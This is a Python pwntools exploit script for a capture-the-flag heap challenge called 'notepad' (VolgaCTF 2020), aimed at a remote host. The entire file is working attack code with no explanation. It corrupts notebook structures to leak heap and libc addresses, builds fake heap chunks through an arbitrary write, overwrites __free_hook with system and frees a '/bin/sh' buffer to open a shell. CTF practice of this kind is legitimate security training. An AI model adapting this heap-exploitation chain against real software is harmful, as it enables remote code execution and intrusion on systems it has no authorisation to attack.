#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('notepad')

host = args.HOST or 'notepad.q.2020.volgactf.ru'
port = int(args.PORT or 45678)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def read_menu():
    return io.recvuntil('> ')

def add_notebook(name):
    global index
    read_menu()
    io.sendline('a')
    io.sendlineafter(b"Enter notebook name: ", name)

def list_notebooks(count):
    read_menu()
    io.sendline('l')
    io.recvuntil("List of notebooks:")
    lst = []
    for i in range(count):
        nb = io.recvline()
        print(nb)
        lst.append(nb)
    return lst

def delete_notebook(index):
    read_menu()
    io.sendline('d')
    io.sendlineafter('Enter index of a notebook to delete: ', str(index))

def pick_notebook(index):
    read_menu()
    io.sendline('p')
    io.sendlineafter('Enter index of a notebook to pick: ', str(index))

def add_tab(name, length, data):
    read_menu()
    io.sendline('a')
    io.sendlineafter("Enter tab name: ", name)
    io.sendlineafter("Enter data length (in bytes): ", str(length))
    io.sendlineafter("Enter the data: ", data)

def view_tab(index):
    read_menu()
    io.sendline('v')
    io.sendlineafter("Enter index of a tab to view: ", str(index))
    return io.recvuntil('Operations', drop=True)

def update_tab(index, name, length, data):
    read_menu()
    io.sendline('u')
    io.sendlineafter("Enter index of tab to update: ", str(index))
    io.sendlineafter("Enter new tab name (leave empty to skip): ", name)
    io.sendlineafter("Enter new data length (leave empty to keep the same): ", str(length))
    io.sendafter("Enter the data: ", data)

def delete_tab(index):
    read_menu()
    io.sendline('d')
    io.sendlineafter("Enter index of tab to delete: ", str(index))

def list_tabs(count):
    read_menu()
    io.sendline('l')
    io.recvline()
    for i in range(count):
        print(io.recvline())

def exit():
    read_menu()
    io.sendline("q")

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

add_notebook("AAAA")
pick_notebook(1)

add_tab("BBBB", 20, "b"*20)
add_tab("CCCC", 20, "c"*20)
add_tab("DDDD", 20, "d"*20)

delete_tab(2)
delete_tab(2)

exit()

delete_notebook(1)

leak_size = 0x100
add_notebook(
    b"NOTEnoteNOTEnote" + p64(2) +
    b"EEEEEEEEEEEEEEEE" + p64(leak_size) + p64(0) + # tabs[0]
    b"FFFFFFFFFFFFFFFF" + p64(leak_size)            # tabs[1]
)

pick_notebook(1)
leak = view_tab(2)

offset_from_heap_to_chunk = 0x7fffc2379290 - 0x7fffc2378000

print(hexdump(leak))

heap_din_mijloc = u64(leak[0xb0:0xb8])
heap_base = heap_din_mijloc - offset_from_heap_to_chunk

print("Leak din mijloc: ", hex(heap_din_mijloc))
print("Base: ", hex(heap_base))

def arbitrary_write(address, data, notebook_id=1):
    add_notebook(
        b"NAMENAMENAMENAME" +   # notebook.name
        p64(1) +                # notebook.num_tabs
        b"NAMENAMENAMENAME" +   # notebook.tabs[0].name
        p64(len(data)) +        # notebook.tabs[0].data_len
        p64(address)            # notebook.tabs[0].data_ptr
    )
    pick_notebook(notebook_id)
    update_tab(1, "", len(data), data)
    exit()

exit()

print (hex(heap_base), hex(heap_base+0x500))

fake_chunk = heap_base + 0x500
arbitrary_write(fake_chunk, 
        p64(0x0) + p64(0x501) + b"A" * (0x500 - 0x10) +
        p64(0x0) + p64(0x41) + b"B" * (0x40 - 0x10) + 
        p64(0x0) + p64(0x41) + b"C" * (0x40 - 0x10), 2)

add_notebook(
    b"NAMENAMENAMENAME" +   # notebook.name
    p64(1) +                # notebook.num_tabs
    b"NAMENAMENAMENAME" +   # notebook.tabs[0].name
    p64(69) +               # notebook.tabs[0].data_len
    p64(fake_chunk + 0x10)         # notebook.tabs[0].data_ptr
)
pick_notebook(3)
delete_tab(1)
exit()
delete_notebook(3)
add_notebook(
    b"NAMENAMENAMENAME" +   # notebook.name
    p64(1) +                # notebook.num_tabs
    b"NAMENAMENAMENAME" +   # notebook.tabs[0].name
    p64(0x100)             # notebook.tabs[0].data_len
)
pick_notebook(3)
leak = u64(view_tab(1)[0x10:0x18]) - 0x3ebca0

print (hex(leak))

libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
libc.address = leak

exit()
arbitrary_write(libc.symbols['__free_hook'], p64(libc.symbols['system']), 4)
pick_notebook(4)
add_tab("baiatu", 7, b"/bin/sh\x00")
delete_tab(2)

io.interactive()
